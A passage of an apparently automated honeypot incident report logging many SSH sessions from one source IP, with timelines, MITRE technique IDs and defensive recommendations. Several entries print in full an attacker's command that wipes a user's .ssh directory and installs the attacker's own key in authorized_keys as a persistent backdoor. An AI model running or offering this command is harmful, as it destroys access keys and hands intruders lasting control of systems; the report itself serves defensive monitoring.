| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:32:04` | `cowrie.session.connect` |
| `2026-04-09 02:32:04` | `cowrie.client.version` |
| `2026-04-09 02:32:05` | `cowrie.client.kex` |
| `2026-04-09 02:32:05` | `cowrie.login.success` |
| `2026-04-09 02:32:06` | `cowrie.session.params` |
| `2026-04-09 02:32:06` | `cowrie.command.input` |
| `2026-04-09 02:32:06` | `cowrie.command.failed` |
| `2026-04-09 02:32:06` | `cowrie.log.closed` |
| `2026-04-09 02:32:06` | `cowrie.session.params` |
| `2026-04-09 02:32:06` | `cowrie.command.input` |
| `2026-04-09 02:32:06` | `cowrie.session.file_download` |
| `2026-04-09 02:32:06` | `cowrie.log.closed` |
| `2026-04-09 02:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87b8df2740b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:32 |
| **Last Seen** | 2026-04-09 02:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:32:08` | `cowrie.session.connect` |
| `2026-04-09 02:32:08` | `cowrie.client.version` |
| `2026-04-09 02:32:08` | `cowrie.client.kex` |
| `2026-04-09 02:32:09` | `cowrie.login.success` |
| `2026-04-09 02:32:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d6c3a7b8f8

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:39 |
| **Last Seen** | 2026-04-09 02:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:39:23` | `cowrie.session.connect` |
| `2026-04-09 02:39:23` | `cowrie.client.version` |
| `2026-04-09 02:39:23` | `cowrie.client.kex` |
| `2026-04-09 02:39:24` | `cowrie.login.success` |
| `2026-04-09 02:39:24` | `cowrie.session.params` |
| `2026-04-09 02:39:24` | `cowrie.command.input` |
| `2026-04-09 02:39:24` | `cowrie.command.failed` |
| `2026-04-09 02:39:24` | `cowrie.log.closed` |
| `2026-04-09 02:39:25` | `cowrie.session.params` |
| `2026-04-09 02:39:25` | `cowrie.command.input` |
| `2026-04-09 02:39:25` | `cowrie.session.file_download` |
| `2026-04-09 02:39:25` | `cowrie.log.closed` |
| `2026-04-09 02:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe91f3680f14

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:39 |
| **Last Seen** | 2026-04-09 02:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:39:29` | `cowrie.session.connect` |
| `2026-04-09 02:39:29` | `cowrie.client.version` |
| `2026-04-09 02:39:29` | `cowrie.client.kex` |
| `2026-04-09 02:39:30` | `cowrie.login.success` |
| `2026-04-09 02:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b08e384102a

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:41 |
| **Last Seen** | 2026-04-09 02:42 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:41:58` | `cowrie.session.connect` |
| `2026-04-09 02:41:58` | `cowrie.client.version` |
| `2026-04-09 02:41:58` | `cowrie.client.kex` |
| `2026-04-09 02:41:59` | `cowrie.login.success` |
| `2026-04-09 02:42:00` | `cowrie.session.params` |
| `2026-04-09 02:42:00` | `cowrie.command.input` |
| `2026-04-09 02:42:00` | `cowrie.command.failed` |
| `2026-04-09 02:42:00` | `cowrie.log.closed` |
| `2026-04-09 02:42:00` | `cowrie.session.params` |
| `2026-04-09 02:42:00` | `cowrie.command.input` |
| `2026-04-09 02:42:00` | `cowrie.session.file_download` |
| `2026-04-09 02:42:00` | `cowrie.log.closed` |
| `2026-04-09 02:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724d7e2005c0

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:42 |
| **Last Seen** | 2026-04-09 02:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:42:08` | `cowrie.session.connect` |
| `2026-04-09 02:42:08` | `cowrie.client.version` |
| `2026-04-09 02:42:08` | `cowrie.client.kex` |
| `2026-04-09 02:42:09` | `cowrie.login.success` |
| `2026-04-09 02:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9f15dfc1ef

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:44 |
| **Last Seen** | 2026-04-09 02:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:44:36` | `cowrie.session.connect` |
| `2026-04-09 02:44:36` | `cowrie.client.version` |
| `2026-04-09 02:44:36` | `cowrie.client.kex` |
| `2026-04-09 02:44:37` | `cowrie.login.success` |
| `2026-04-09 02:44:39` | `cowrie.session.params` |
| `2026-04-09 02:44:39` | `cowrie.command.input` |
| `2026-04-09 02:44:39` | `cowrie.command.failed` |
| `2026-04-09 02:44:40` | `cowrie.log.closed` |
| `2026-04-09 02:44:40` | `cowrie.session.params` |
| `2026-04-09 02:44:40` | `cowrie.command.input` |
| `2026-04-09 02:44:41` | `cowrie.session.file_download` |
| `2026-04-09 02:44:41` | `cowrie.log.closed` |
| `2026-04-09 02:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f17b95f1b1

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:44 |
| **Last Seen** | 2026-04-09 02:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:44:45` | `cowrie.session.connect` |
| `2026-04-09 02:44:45` | `cowrie.client.version` |
| `2026-04-09 02:44:46` | `cowrie.client.kex` |
| `2026-04-09 02:44:47` | `cowrie.login.success` |
| `2026-04-09 02:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c02ac355e382

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:52 |
| **Last Seen** | 2026-04-09 02:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:52:14` | `cowrie.session.connect` |
| `2026-04-09 02:52:14` | `cowrie.client.version` |
| `2026-04-09 02:52:14` | `cowrie.client.kex` |
| `2026-04-09 02:52:15` | `cowrie.login.success` |
| `2026-04-09 02:52:15` | `cowrie.session.params` |
| `2026-04-09 02:52:15` | `cowrie.command.input` |
| `2026-04-09 02:52:15` | `cowrie.command.failed` |
| `2026-04-09 02:52:15` | `cowrie.log.closed` |
| `2026-04-09 02:52:15` | `cowrie.session.params` |
| `2026-04-09 02:52:15` | `cowrie.command.input` |
| `2026-04-09 02:52:16` | `cowrie.session.file_download` |
| `2026-04-09 02:52:16` | `cowrie.log.closed` |
| `2026-04-09 02:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2f4eec818e

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:52 |
| **Last Seen** | 2026-04-09 02:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:52:18` | `cowrie.session.connect` |
| `2026-04-09 02:52:18` | `cowrie.client.version` |
| `2026-04-09 02:52:18` | `cowrie.client.kex` |
| `2026-04-09 02:52:18` | `cowrie.login.success` |
| `2026-04-09 02:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7168861e7a52

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:54 |
| **Last Seen** | 2026-04-09 02:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:54:01` | `cowrie.session.connect` |
| `2026-04-09 02:54:01` | `cowrie.client.version` |
| `2026-04-09 02:54:01` | `cowrie.client.kex` |
| `2026-04-09 02:54:01` | `cowrie.login.success` |
| `2026-04-09 02:54:02` | `cowrie.session.params` |
| `2026-04-09 02:54:02` | `cowrie.command.input` |
| `2026-04-09 02:54:02` | `cowrie.command.failed` |
| `2026-04-09 02:54:02` | `cowrie.log.closed` |
| `2026-04-09 02:54:02` | `cowrie.session.params` |
| `2026-04-09 02:54:02` | `cowrie.command.input` |
| `2026-04-09 02:54:02` | `cowrie.session.file_download` |
| `2026-04-09 02:54:02` | `cowrie.log.closed` |
| `2026-04-09 02:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be59f28ee81b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:54 |
| **Last Seen** | 2026-04-09 02:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:54:05` | `cowrie.session.connect` |
| `2026-04-09 02:54:05` | `cowrie.client.version` |
| `2026-04-09 02:54:05` | `cowrie.client.kex` |
| `2026-04-09 02:54:05` | `cowrie.login.success` |
| `2026-04-09 02:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb4cc54294e8

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:55 |
| **Last Seen** | 2026-04-09 02:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:55:41` | `cowrie.session.connect` |
| `2026-04-09 02:55:41` | `cowrie.client.version` |
| `2026-04-09 02:55:41` | `cowrie.client.kex` |
| `2026-04-09 02:55:42` | `cowrie.login.success` |
| `2026-04-09 02:55:42` | `cowrie.session.params` |
| `2026-04-09 02:55:42` | `cowrie.command.input` |
| `2026-04-09 02:55:42` | `cowrie.command.failed` |
| `2026-04-09 02:55:42` | `cowrie.log.closed` |
| `2026-04-09 02:55:43` | `cowrie.session.params` |
| `2026-04-09 02:55:43` | `cowrie.command.input` |
| `2026-04-09 02:55:43` | `cowrie.session.file_download` |
| `2026-04-09 02:55:43` | `cowrie.log.closed` |
| `2026-04-09 02:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a8d4cced5e

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 02:55 |
| **Last Seen** | 2026-04-09 02:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 02:55:45` | `cowrie.session.connect` |
| `2026-04-09 02:55:45` | `cowrie.client.version` |
| `2026-04-09 02:55:45` | `cowrie.client.kex` |
| `2026-04-09 02:55:46` | `cowrie.login.success` |
| `2026-04-09 02:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67773d8ff977

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:02 |
| **Last Seen** | 2026-04-09 03:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:02:34` | `cowrie.session.connect` |
| `2026-04-09 03:02:34` | `cowrie.client.version` |
| `2026-04-09 03:02:34` | `cowrie.client.kex` |
| `2026-04-09 03:02:35` | `cowrie.login.success` |
| `2026-04-09 03:02:35` | `cowrie.session.params` |
| `2026-04-09 03:02:35` | `cowrie.command.input` |
| `2026-04-09 03:02:35` | `cowrie.command.failed` |
| `2026-04-09 03:02:35` | `cowrie.log.closed` |
| `2026-04-09 03:02:36` | `cowrie.session.params` |
| `2026-04-09 03:02:36` | `cowrie.command.input` |
| `2026-04-09 03:02:36` | `cowrie.session.file_download` |
| `2026-04-09 03:02:36` | `cowrie.log.closed` |
| `2026-04-09 03:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5ab57320d3

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:02 |
| **Last Seen** | 2026-04-09 03:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:02:38` | `cowrie.session.connect` |
| `2026-04-09 03:02:38` | `cowrie.client.version` |
| `2026-04-09 03:02:38` | `cowrie.client.kex` |
| `2026-04-09 03:02:39` | `cowrie.login.success` |
| `2026-04-09 03:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9dcea56843e

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-04-09 03:04 |
| **Last Seen** | 2026-04-09 03:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 03:04:24` | `cowrie.session.connect` |
| `2026-04-09 03:04:24` | `cowrie.client.version` |
| `2026-04-09 03:04:24` | `cowrie.client.kex` |
| `2026-04-09 03:04:25` | `cowrie.login.success` |
| `2026-04-09 03:04:25` | `cowrie.session.params` |
| `2026-04-09 03:04:25` | `cowrie.command.input` |
